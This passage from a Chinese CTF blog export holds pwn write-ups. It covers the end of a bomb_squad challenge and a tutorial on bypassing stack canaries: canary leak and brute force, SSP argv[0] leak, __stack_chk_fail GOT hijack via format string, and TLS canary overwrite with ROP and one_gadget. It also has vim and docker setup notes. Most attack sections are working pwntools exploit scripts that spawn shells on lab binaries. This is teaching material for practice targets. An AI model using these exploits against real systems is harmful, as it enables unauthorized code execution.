++i ) &#123; if ( v5[i] &lt; 0 || v5[i] &gt; 3 ) explode_bomb(); v2 = (node *)*((_DWORD *)&amp;v2-&gt;next1 + v5[i]); result = v2-&gt;num; v3 += result; &#125; if ( v3 != 95 ) explode_bomb(); phase4_solved = 1; return result;&#125; 这里n1是一个结构体，大致结构如下 12345678struct node&#123; node* next1; node* next2; node* next3; node* next4; char name[8]; int num;&#125;; 这一关接收用户输入的数字，根据数字来进行结构体之间num相加的顺序。 比如输入为"0 3"，相加的顺序就是0xa+0x7+0x10。 最后试出来解为3 0 3 0 3 0 0。 secret_phase 通关之后会进入print_flag，经过verify_working之后会打印出来flag 123456789void __noreturn print_flag()&#123; if ( verify_working() ) &#123; puts("Congratulations, you won! Here's the flag:"); system("cat flag.txt"); &#125; exit(1);&#125; 但是verify_working始终返回1的，而且最终也并没有得到flag，还是需要getshell。 进入secret_phase 123456789101112131415161718int secret_phase()&#123; puts("this is the secret phase.... please whisper, to keep it a seecret..."); v2 = &amp;n1; v3 = n2; v4 = &amp;n3; v5 = &amp;n4; v6 = &amp;n5; v7 = &amp;n6; for ( i = 0; i &lt;= 5; ++i ) &#123; printf("Rename node #%d to: ", i + 1); fgets((*(&amp;v2 + i))-&gt;name, 9, stdin); *(_BYTE *)strchrnul((*(&amp;v2 + i))-&gt;name, 10) = 0; putchar(10); &#125; return puts("Thanks, I was worried about having to come up with clever names myself!");&#125; 这一段代码是修改每一个node的name成员，最多只可以溢出一个字节到num上面，并没有什么用。 fini段 该section保存着进程终止代码指令。因此，当一个程序正常退出时，系统安排执行这个section的中的代码。 .fini_array中有一个__gg函数 1234567891011121314151617181920212223v5 = &amp;n1;v6 = n2;v7 = &amp;n3;v8 = &amp;n4;v9 = &amp;n5;v10 = &amp;n6;for ( i = 0; i &lt;= 5; ++i )&#123; v0 = alloca(32); v1 = *(&amp;v5 + i); v2 = (_DWORD *)(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4)); *v2 = *v1; v2[1] = v1[1]; v2[2] = v1[2]; v2[3] = v1[3]; v2[4] = v1[4]; v2[5] = v1[5]; v2[6] = v1[6]; result = *(_DWORD *)(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4) + 0x14); if ( result ) result = (*(int (**)(void))(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4) + 0x14))();&#125;return result; 经过分析之后发现这个函数会执行每个node中name[4]-name[8]所指向的函数，而name自然可以控制。并且call的时候，此时栈顶指向的就是当前node。那么只需要把某一个node的name后四个字节修改成system，next1指向的内容修改为/bin/sh\x00就可以getshell。 任意地址写 __nr函数： 123456789unsigned int _nr()&#123; v5 = __readgsdword(0x14u); v0 = (const char *)get_line(); strcpy(&amp;dest, v0); v1 = (const char *)get_line(); strcpy(v4, v1); return __readgsdword(0x14u) ^ v5;&#125; 很明显的栈溢出，可以通过第一个输入，将v4覆盖为node-&gt;next1的地址，通过第二个输入在修改next1所指向的内容。 payload 1234567891011121314151617from pwn import *p = process("./bomb_squad")p.sendline("8584")p.sendline("[1, 1, 3, 5, 11, 21]")p.sendline("\x00")p.sendline("3 0 3 0 3 0 0")system = 0x080485A0n3 = 0x804b0a8nr = 0x08048CDApayload = 'aaaa' + p32(nr) #首先利用__gg函数执行node1中的__nr函数p.send(payload)payload = 'bbbb' + p32(system) + "\n\n\n\n" #接着写入system地址到node2等待第二次call，最后4个\n跳过剩下4个node-&gt;name的修改p.send(payload) payload = 'a' * 0xfc + p32(n3) #栈溢出，修改n3-&gt;next1指向的内容p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() 之所以为什么是要修改n3-&gt;next1，因为system地址写入到了node2的name中，当__gg函数执行时，此时栈顶排列为 n3 n4 n5 n6 name num 接下来就要执行system函数，所以要修改n3指向的地址。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于vim的复制粘贴]]></title>
    <url>%2F2019%2F06%2F01%2Fvim%2F</url>
    <content type="text"><![CDATA[学习Canary相关的东西时，因为要从网上复制粘贴各种代码，因为缩进问题，复制完之后的效果惨不忍睹，比如这样： 过于惨不忍睹，markdown的代码框展现不出来效果 解决方法的话就是在粘贴前先输入:set paste，接着进入insert模式的时候后面就会多个(paste)，这样复制进去的就和你原本看到的一样了]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Canary原理以及绕过]]></title>
    <url>%2F2019%2F05%2F31%2Fcanary%2F</url>
    <content type="text"><![CDATA[Canary原理以及绕过 Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理 1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | Canary value | +-----------------+ | 局部变量 | Low | | Address 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，Canary则未修改，不为0就是发生了缓冲区溢出。 12345;异或检查Canarymov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，fs:[0x28]则指向了stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果可以溢出覆盖tls的话，就可以绕过Canary 如果Canary已被修改，程序会走到 __stack_chk_fail 1234567891011121314//eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; Canary绕过 泄露Canary 漏洞代码： 1234567891011121314151617181920212223242526// ex2.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) &#123; system("/bin/sh");&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void vuln() &#123; char buf[100]; for(int i=0;i&lt;2;i++)&#123; read(0, buf, 0x200); printf(buf); &#125;&#125;int main(void) &#123; init(); puts("Hello Hacker!"); vuln(); return 0;&#125; 编译为32位程序，开启Canary保护，关闭PIE： 1gcc -m32 -fstack-protector -no-pie ex2.c -o ex2 ida打开，在vuln处下断点，程序执行到这里时往栈上添加Canary。 12.text:565C5280 mov eax, large gs:14h.text:565C5286 mov [ebp+var_C], eax ;ebp+var_C=FF80175C 接着到read的位置 buf的位置在FF8016F8，Canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节 也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到Canary的低位字节。 Canary设计为以字节 \x00 结尾，本意是为了保证 Canary可以截断字符串，想要打印出Canary就只有覆盖低位字节 得到Canary值后接下来就是普通的rop了 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom pwn import *context.binary = 'ex2'#context.log_level = 'debug'io = process('./ex2')get_shell = ELF("./ex2").sym["getshell"]io.recvuntil("Hello Hacker!\n")# leak Canarypayload = "A"*100io.sendline(payload)io.recvuntil("A"*100)Canary = u32(io.recv(4))-0xalog.info("Canary:"+hex(Canary))# Bypass Canarypayload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)io.send(payload)io.recv()io.interactive() 爆破Canary pid_t fork( void); 返回值： 若成功调用一次则返回两个值，子进程返回0，父进程返回子进程ID；否则，出错返回-1 个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而父进程中返回子进程ID。 子进程是父进程的副本，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的“副本”，这意味着父子进程间不共享这些存储空间。 利用fork就可以进行对Canary的爆破 ida: 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; __pid_t v3; // [esp+Ch] [ebp-Ch] init(); while ( 1 ) &#123; v3 = fork(); if ( v3 &lt; 0 ) break; //fork失败了就退出 if ( v3 ) &#123; wait(0); //父进程卡在这里 &#125; else &#123; puts("welcome"); //子进程执行漏洞 fun(); puts("recv sucess"); &#125; &#125; puts("fork error"); exit(0); 直接下断点调试的话是断在父进程里面，一直在wait()，可以先在fun()中的read()函数处下断点，接着去docker里面直接运行程序，从ida里面attach上去，此时里面有两个bin1，pid值较大的那一个就是子进程。 经过调试后，得知buf到Canary需要100字节，Canary到return地址需要12字节，编写exp: 1234567891011121314151617181920212223242526272829from pwn import *#context.log_level = 'debug'debug=1if debug: io=process("./bin1")else: io=remote("172.17.0.2",10001)canary='\x00'io.recvuntil("welcome\n")for i in range(3): for j in range(256): io.send('a'*100+canary+chr(j)) tmp=io.recvuntil("welcome\n") //输出recv success之后还会输出welcome，所以根据welcome判断，recvall()不知道为什么会卡住 if "recv" in tmp: canary+=chr(j) breakget_flag=0x0804863Bpayload='a'*100+canary+'a'*12+p32(get_flag)io.sendline(payload)print io.recvline() //recvall也会卡住 Stack-smashing Protection (SSP) 当Canary值比较不正确时，程序就会跳转到__stack_chk_fail， Libc 2.23 先看下__stack_chk_fail的源码： 12345678910// debug/stack_chk_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125; 其中调用了__fortify_fail 1234567891011121314// debug/fortify_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125;libc_hidden_def (__fortify_fail) __fortify_fail 调用__libc_message 打印错误信息和 argv[0] ,当输入的字符串长度足够长时，就可以覆盖到argv[0]，就可以通过报错泄露出信息。 pwn 32C3CTF2015 readme 1561905867614 第一次的输入也就是IO_gets()存在缓冲区溢出漏洞，而第二次的输入将覆盖flag 虽然flag被覆盖掉了，但是程序中还存在一个flag，这个就涉及到了linux系统中elf文件的映射 1234567gdb-peda$ b *0x0040080eBreakpoint 1 at 0x40080egdb-peda$ rgdb-peda$ vmmap readme.binStart End Perm Name0x00400000 0x00401000 r-xp /home/firmyy/readme.bin0x00600000 0x00601000 rw-p /home/firmyy/readme.bin 由此可以看出readme.bin被映射到到了两个地方，而只要在程序0x00000000~0x00001000内的数据，都会被映射到内存中，flag的位置在0x00000D20，也就是说flag也被映射到了0x00400D20和0x006000D20这两个内存地址当中，所以即使0x006000D20的被覆盖了，0x00400D20的也依旧存在。 由于要利用__stack_chk_fail泄露flag，需要找出argv[0]距离缓冲区的距离 gdb中直接在main函数处下断点： 1234567891011121314151617181920212223242526272829303132333435363738[----------------------------------registers-----------------------------------]RAX: 0x4006d0 (sub rsp,0x8)RBX: 0x0 RCX: 0x7ffff7fa9718 --&gt; 0x7ffff7faad80 --&gt; 0x0 RDX: 0x7fffffffe608 --&gt; 0x7fffffffe837 (&quot;SHELL=/bin/bash&quot;)RSI: 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)RDI: 0x1 RBP: 0x4008b0 (push r15)RSP: 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;: mov edi,eax)RIP: 0x4006d0 (sub rsp,0x8)R8 : 0x7ffff7faad80 --&gt; 0x0 R9 : 0x7ffff7faad80 --&gt; 0x0 R10: 0xfffffffffffff46b R11: 0x7ffff7e11fb0 (&lt;__libc_start_main&gt;: push r14)R12: 0x4006ee (xor ebp,ebp)R13: 0x7fffffffe5f0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x4006c0 &lt;_IO_gets@plt&gt;: jmp QWORD PTR [rip+0x20062a] # 0x600cf0 &lt;_IO_gets@got.plt&gt; 0x4006c6 &lt;_IO_gets@plt+6&gt;: push 0x9 0x4006cb &lt;_IO_gets@plt+11&gt;: jmp 0x400620=&gt; 0x4006d0: sub rsp,0x8 0x4006d4: mov rdi,QWORD PTR [rip+0x200665] # 0x600d40 &lt;stdout&gt; 0x4006db: xor esi,esi 0x4006dd: call 0x400660 &lt;setbuf@plt&gt; 0x4006e2: call 0x4007e0[------------------------------------stack-------------------------------------]0000| 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;: mov edi,eax)0008| 0x7fffffffe520 --&gt; 0x0 0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)0024| 0x7fffffffe530 --&gt; 0x100000000 0032| 0x7fffffffe538 --&gt; 0x4006d0 (sub rsp,0x8)0040| 0x7fffffffe540 --&gt; 0x0 0048| 0x7fffffffe548 --&gt; 0x9266eaee5b02c2c9 0056| 0x7fffffffe550 --&gt; 0x4006ee (xor ebp,ebp)[------------------------------------------------------------------------------] 其中，0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 ("/root/readme.bin")就是argv[0]的地址了。 argv 是 argument vector的缩写，表示传入main函数的参数序列或指针，并且第一个参数argv[0]一定是程序的名称，并且包含了程序所在的完整路径 接下来运行到_IO_gets处，查看缓冲区的地址，计算得到要覆盖到argv[0]的话需要0x218个字节。 挂载程序： 1$ socat tcp4-listen:10001,reuseaddr,fork exec:./readme.bin,stderr payload: 12345678from pwn import *io = remote("172.17.0.2", 10001)payload_1 = "A"*0x218 + p64(0x400d20)io.sendline(payload_1)payload_2 = "A"*4io.sendline(payload_2)print io.recvall() 但是执行完payload后，执行的终端里没有打印出flag，而在服务器的终端中打印了出来 特别注意要控制LIBC_FATAL_STDERR_=1让fortify_fail能够把输出作为stderr给我们。否则fortify_fail下层接的是libc_message，而libc_message调用的是getenv。 getenv就是从environ指针那里去找环境变量指针数组。 getenv如果发现这环境变量没设置，libc_message会syscall调用open('/dev/tty')，输出你是看不到的。 https://bbs.pediy.com/thread-223664.htm 所以需要利用第二次的写入将LIBC_FATAL_STDERR_=1写入到环境变量中，这样自己的终端才可以接收到flag payload： 12345678910from pwn import *io = remote("172.17.0.2", 10001)payload_1 = "A"*0x218 + p64(0x400d20)+p64(0)+p64(0x600d20) #p64(0)是argv[0]指针与环境变量之间的隔断。 #p64(0x600d20)是第二次输出写入环境变量的指针io.sendline(payload_1)payload_2 = "LIBC_FATAL_STDERR_=1"io.sendline(payload_2)print io.recvall() Libc 2.25 然而在2.25中调用的函数有所改变 123456789//stack_chk_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail_abort (false, "stack smashing detected");&#125;strong_alias (__stack_chk_fail, __stack_chk_fail_local) 这里面调用了__fortify_fail_abort 而不是__fortify_fail 1234567891011121314151617181920212223242526extern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg)&#123; /* The loop is added only to keep gcc happy. Don't pass down __libc_argv[0] if we aren't doing backtrace since __libc_argv[0] may point to the corrupted stack. */ while (1) __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort, "*** %s ***: %s terminated\n", msg, (need_backtrace &amp;&amp; __libc_argv[0] != NULL ? __libc_argv[0] : "&lt;unknown&gt;"));&#125;void__attribute__ ((noreturn))__fortify_fail (const char *msg)&#123; __fortify_fail_abort (true, msg);&#125;libc_hidden_def (__fortify_fail)libc_hidden_def (__fortify_fail_abort) 函数 __fortify_fail_abort() 在第一个参数为 false 时不再进行栈回溯，直接以打印出字符串 &lt;unknown&gt; 结束，也就没有办法输出 argv[0] 了。 劫持__stack_chk_fail函数 Canary校验失败后会进入__stack_chk_fail函数中，__stack_chk_fail函数本身也是一个普通的延迟绑定函数，如果可以修改GOT表，就可以成功劫持到__stack_chk_fail函数。 题目代码： 123456789101112//mainint __cdecl main(int argc, const char **argv, const char **envp)&#123; char format; // [rsp+0h] [rbp-60h] unsigned __int64 v5; // [rsp+58h] [rbp-8h] v5 = __readfsqword(0x28u); init(*(_QWORD *)&amp;argc, argv, envp); read_n((__int64)&amp;format, 88u); printf(&amp;format, 88LL); return 0;&#125; 12345//backdoorint backdoor()&#123; return system("/bin/sh");&#125; main函数中存在格式化字符串漏洞，而程序本身自带一个后门。 checksec： 123456[*] '/root/ctf/canary/bin3/bin3' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 有Canary，不能直接覆盖return地址。但可以覆盖__stack_chk_fail地址来达到相同效果。 先计算出buff到canary的距离为88字节，接着构造payload。 123456789%78c%12$hhn %186c%13$hhn%56c%14$hhn%192c%15$hhnaa\x20\x10\x60\x00\x21\x10\x60\x00\x22\x10\x60\x00\x23\x10\x60\x00 因为程序是64位的，地址高位通常都有\x00，所以要放在后面，中间的两个字符'a'用来对齐。 payload: 123456789101112131415161718192021from pwn import *context.log_level='debug'context.arch='amd64'#p=process("./bin3")p=remote("172.17.0.2",10001)elf=ELF("./bin3")#raw_input()stack_chk_fail_got=elf.got['__stack_chk_fail']backdoor=0x40084Epayload="%78c%12$hhn%186c%13$hhn%56c%14$hhn%192c%15$hhnaa"payload+=p64(0x601020)payload+=p64(0x601021)payload+=p64(0x601022)payload+=p64(0x601023)print p.recv()p.sendline(payload+"a"*16) #构造好payload后还需要16个字节来覆盖Canary，触发__stack_chk_fail函数p.interactive() 覆盖TLS中的Canary 线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。这种对象的链接性（linkage）可以是静态的也可是外部的。 Canary在fs:0x28中，而fs寄存器指向的是当前栈的TLS结构，所以，当溢出字节足够多时，可以覆盖到Canary，达到绕过Canary的效果。 题目代码： StarCTF2018 babystack 123456789101112131415161718192021222324252627282930signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 result; // rax pthread_t newthread; // [rsp+0h] [rbp-10h] unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(byte_400C96); puts(" # # #### ##### ######"); puts(" # # # # # #"); puts("### ### # # #####"); puts(" # # # # #"); puts(" # # # # # #"); puts(" #### # #"); puts(byte_400C96); pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, 0LL); if ( pthread_join(newthread, 0LL) ) &#123; puts("exit failure"); result = 1LL; &#125; else &#123; puts("Bye bye"); result = 0LL; &#125; return result;&#125; 12345678910111213141516171819202122void *__fastcall start_routine(void *a1)&#123; unsigned __int64 size; // [rsp+8h] [rbp-1018h] char buf; // [rsp+10h] [rbp-1010h] unsigned __int64 v4; // [rsp+1018h] [rbp-8h] v4 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x1000uLL); puts("Welcome to babystack 2018!"); puts("How many bytes do you want to send?"); size = get_size(); if ( size &lt;= 0x10000 ) &#123; get_string(0, (__int64)&amp;buf, size); puts("It's time to say goodbye."); &#125; else &#123; puts("You are greedy!"); &#125; return 0LL;&#125; 程序可以接收0x10000个字节，显然足够覆盖到Canary了，但是程序中没有后门和system函数，所以需要自己构造gadgets来getshell。 首先要爆破出Canary的位置 123456789101112131415161718192021from pwn import *offset=0x1020while True: p = process('./bs') p.recvuntil("How many bytes do you want to send?") p.sendline(str(offset)) payload = '' payload += 'a'*0x1010 #buff payload += p64(0xdeadbeef) #ebp payload += p64(main_addr) #return payload += 'a'*(offset-len(payload)) #padding p.sendline(payload) temp = p.recvall() if "Welcome" in temp: p.close() print offset break else: offset += 1 p.close() 得到offset为6128。 但是测试的时候宿主机得到的offset为6224，而docker中得到的是6128，应该和系统版本有关。 P.S.：docker中查看系统版本不能使用uanme -a或者cat /proc/version，这样查到的是宿主机的版本，要使用cat /etc/issue。 接着可以构造payload，泄露出__libc_start_main的地址，利用libc-database查找libc版本。 123456789101112131415161718192021from pwn import *context.log_level="debug"offset=6128p=remote("172.17.0.2",10001)elf=ELF("./bs")pop_rdi_ret = 0x400c03libc_main_start = elf.got["__libc_start_main"]puts_plt = elf.symbols["puts"]p.recvuntil("How many bytes do you want to send?\n")p.sendline(str(offset))payload = ''payload += 'a'*0x1010payload += p64(0xdeadbeef)payload += p64(pop_rdi_ret)payload += p64(libc_main_start)payload += p64(puts_plt)payload += 'a'*(offset-len(payload))p.sendline(payload)print p.recv() libc-database： 1234root@kali:~/libc-database# ./find __libc_start_main 740ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)archive-glibc (id libc6_2.23-0ubuntu11_amd64)archive-glibc (id libc6_2.23-0ubuntu3_amd64) 接着使用./download libc6_2.23-0ubuntu10_amd64下载libc，并将其中的libc.so.6移动至题目同目录下，在payload中加载libc。 one_gadget查找可用的gadget 1234567891011121314150x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 但是返回到gadget上面之后程序会报错，原因是atol函数会取fs:[eax]中的值，而这个地址为了覆盖Canary也被波及到了，所以需要在bss段中开辟一个新空间，并且将esp的地址覆盖为新空间的地址，这里就利用到了frame faking。 payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')#p = process('./bs')p=remote("172.17.0.2",10001)raw_input()elf = ELF("./bs")libc=ELF("./libc.so.6") main_addr = 0x4009E7offset = 6128bss_start = elf.bss()fakebuf = bss_start + 0x300pop_rdi_ret = 0x400c03pop_rsi_r15_ret = 0x400c01leave_ret = 0x400955puts_got = elf.got["puts"]puts_plt = elf.symbols["puts"]puts_libc = libc.symbols["puts"]read_plt = elf.symbols["read"]p.recvuntil("How many bytes do you want to send?")p.sendline(str(offset))payload = ''payload += 'a'*0x1010 payload += p64(fakebuf) #覆盖EBP，frame faking之后的新esppayload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_r15_ret)payload += p64(fakebuf)payload += p64(0x0) #填充一个无意义的值给r15payload += p64(read_plt) #将one_gadget写入bss中payload += p64(leave_ret)payload += 'a'*(offset - len(payload))p.send(payload)p.recvuntil("It's time to say goodbye.\n")puts_addr = u64(p.recv()[:6].ljust(8,'\x00'))print hex(puts_addr)getshell_libc = 0xf02a4base_addr = puts_addr - puts_libcone_gadget = base_addr + getshell_libcpayload = ''payload += p64(0xdeadbeef)payload += p64(one_gadget)p.send(payload)p.interactive() BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。 BSS 段“存放”的是未初始化的全局变量与局部静态变量，此处指的存放是指为其预留空间（占位符）。但BSS段在磁盘上不是真的占用变量大小的空间，它仅是在该段中记录了所有未初始化全局变量与局部静态变量的大小总和，至于每个变量的大小则存储在符号表的size属性中。即： BSS段内容：无内容，它将在段表中占一个段描述符，该段描述符的size属性将记录未初始化的全局变量与局部静态变量的大小总和。 每个未初始化全局对象与静态对象的大小：存储在符号表的 size 属性中。 并且由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建环境]]></title>
    <url>%2F2019%2F05%2F30%2F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[kali配置 安装docker 正常情况下用docker官方的文档安装就行，但是执行到下面这条命令时会报错 1234$ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 错误： 1aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Kali/n/a 具体原因是什么至今也没查到，可能是和kali版本有关系吧 解决方法： 自己添加源就可以了 1deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable 安装成功后执行systemctl enable docker使docker开机自启。 再找一个合适的环境pull下，找了半天发现pwnbox不错，有一个run.sh可以快捷启动环境，但是没有ida调试文件和没有端口映射，自己改了改文件之后就好用多了。 run.sh: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env bash# Run superkojiman/pwnbox container in docker.# Store your .gdbinit, .radare2rc, .vimrc, etc in a ./rc directory. The contents will be copied to# /root/ in the container.ESC="\x1B["RESET=$ESC"39m"RED=$ESC"31m"GREEN=$ESC"32m"BLUE=$ESC"34m"if [[ -z $&#123;1&#125; ]]; then echo -e "$&#123;RED&#125;Missing argument CTF name.$&#123;RESET&#125;" exit 0fictf_name=$&#123;1&#125;# Create docker container and run in the background# Add this if you need to modify anything in /proc: --privileged docker run -it \ -h $&#123;ctf_name&#125; \ -d \ -p 23946:23946 \ --security-opt seccomp:unconfined \ --name $&#123;ctf_name&#125; \ superkojiman/pwnbox# Tar config files in rc and extract it into the containerif [[ -d rc ]]; then cd rc if [[ -f rc.tar ]]; then rm -f rc.tar fi for i in .*; do if [[ ! $&#123;i&#125; == "." &amp;&amp; ! $&#123;i&#125; == ".." ]]; then tar rf rc.tar $&#123;i&#125; fi done cd - &gt; /dev/null 2&gt;&amp;1 cat rc/rc.tar | docker cp - $&#123;ctf_name&#125;:/root/ rm -f rc/rc.tarelse echo -e "$&#123;RED&#125;No rc directory found. Nothing to copy to container.$&#123;RESET&#125;"fi# Create stop/rm script for containercat &lt;&lt; EOF &gt; $&#123;ctf_name&#125;-stop.sh#!/bin/bashdocker stop $&#123;ctf_name&#125;docker rm $&#123;ctf_name&#125;rm -f $&#123;ctf_name&#125;-stop.shEOFchmod 755 $&#123;ctf_name&#125;-stop.sh# Create a workdir for this CTFdocker exec $&#123;ctf_name&#125; mkdir /root/workdocker cp linux_server $&#123;ctf_name&#125;:/root/workdocker cp linux_server64 $&#123;ctf_name&#125;:/root/work# Get a shellecho -e "$&#123;GREEN&#125; ______ $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___________ ___________ /___________ __$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___ __ \\_ | /| / /_ __ \\_ __ \\ __ \\_ |/_/$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;__ /_/ /_ |/ |/ /_ / / / /_/ / /_/ /_&gt; &lt; $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;_ .___/____/|__/ /_/ /_//_.___/\\____//_/|_| $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;/_/ by superkojiman $&#123;RESET&#125;"echo ""docker attach $&#123;ctf_name&#125; 需要同目录下有linux_server和linux_server64文件(在ida安装目录下的dbgsrv里面)。 接下来对本机vim进行配置，安装YouCompleteMe和一些缩进的配置。 .vimrc: 123456789101112131415161718192021222324set nocompatibleset rtp+=~/.vim/plugged/set numberset t_Co=256syntax onset autoindentset smartindentset tabstop=4set shiftwidth=4"themecolorscheme molokai"YouCompleteMelet g:ycm_global_ycm_extra_conf = '~/.ycm_extra_conf.py'let g:ycm_min_num_of_chars_for_completion=1let g:ycm_warning_symbol='&gt;*'let g:ycm_error_symbol='&gt;&gt;'call plug#begin('~/.vim/plugged')Plug 'Valloric/YouCompleteMe'call plug#end() YouCompleteMe clone到vim里面后，还需要进去编译一下，执行 123sudo apt install build-essential cmake python3-devcd ~/.vim/plugged/YouCompleteMepython3 install.py --clang-completer 到此为止就差不多够用了]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new "My New Post" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
